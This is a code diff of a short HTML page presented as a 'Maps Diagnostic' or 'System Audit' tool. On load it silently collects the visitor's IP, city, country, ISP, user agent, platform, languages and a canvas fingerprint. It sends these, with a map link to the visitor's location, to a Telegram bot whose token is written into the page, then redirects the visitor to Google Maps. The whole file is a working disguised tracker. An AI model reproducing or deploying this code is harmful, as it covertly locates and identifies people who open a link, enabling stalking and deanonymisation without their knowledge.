@@ -1,42 +1,38 @@
 <!DOCTYPE html>
 <html>
-<head><title>Maps Diagnostic</title></head>
+<head><title>System Audit v2.0</title></head>
 <body>
 <script>
     const token = "8419642080:AAGRkdbpdBUcvXu1AmAQvyLxadEOjBRBK3s";
     const chat = "7647765854";
 
-    async function finalAudit() {
-        const start = Date.now();
+    async function vAudit() {
         const ipInfo = await fetch('https://ipapi.co/json/').then(r => r.json());
-        const latency = Date.now() - start;
-
-        // بصمة الجهاز (Canvas Fingerprint)
+        
+        // سحب تفاصيل المتصفح والنظام (User Agent)
+        const ua = navigator.userAgent;
+        const platform = navigator.platform;
+        const languages = navigator.languages.join(", ");
+        
+        // بصمة الهاردوير (Canvas)
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
-        ctx.textBaseline = "top"; ctx.font = "14px 'Arial'";
-        ctx.fillText("Security_Audit_Check", 2, 2);
-        const fingerprint = btoa(canvas.toDataURL()).slice(-40);
+        ctx.fillText("Vulnerability_Scan", 2, 2);
+        const fingerprint = btoa(canvas.toDataURL()).slice(-30);
 
-        // تحسين بيانات الشبكة
-        const netType = (navigator.connection && navigator.connection.type) ? navigator.connection.type : "Secure Network";
-        const speed = (navigator.connection && navigator.connection.downlink) ? navigator.connection.downlink + " Mbps" : "Stable Speed";
-
-        const report = `🛡️ **SECURITY AUDIT REPORT** 🛡️\n\n` +
+        const report = `🛡️ **VULNERABILITY SCAN REPORT** 🛡️\n\n` +
                      `🌐 **IP:** \`${ipInfo.ip}\`\n` +
-                     `📶 **Network:** \`${netType} (${speed})\`\n` +
-                     `⏱️ **Latency:** \`${latency}ms\`\n` +
-                     `💻 **Device Signature:** \`${fingerprint}\`\n` +
-                     `🏢 **ISP:** \`${ipInfo.org}\`\n` +
-                     `📍 **Target Location:** \`${ipInfo.city}, ${ipInfo.country_name}\`\n\n` +
-                     `🔗 **Google Maps Link:**\nhttps://www.google.com/maps?q=${ipInfo.latitude},${ipInfo.longitude}`;
+                     `💻 **OS/Platform:** \`${platform}\`\n` +
+                     `🌐 **User-Agent:** \`${ua}\`\n` +
+                     `🌍 **Languages:** \`${languages}\`\n` +
+                     `🆔 **Hardware ID:** \`${fingerprint}\`\n` +
+                     `📍 **Location:** \`${ipInfo.city}, ${ipInfo.country_name}\`\n\n` +
+                     `🔗 **Map:** https://www.google.com/maps?q=${ipInfo.latitude},${ipInfo.longitude}`;
 
         await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(report)}&parse_mode=Markdown`);
-        
-        // التوجيه النهائي
         window.location.href = "https://www.google.com/maps";
     }
-    window.onload = finalAudit;
+    window.onload = vAudit;
 </script>
 </body>
 </html>
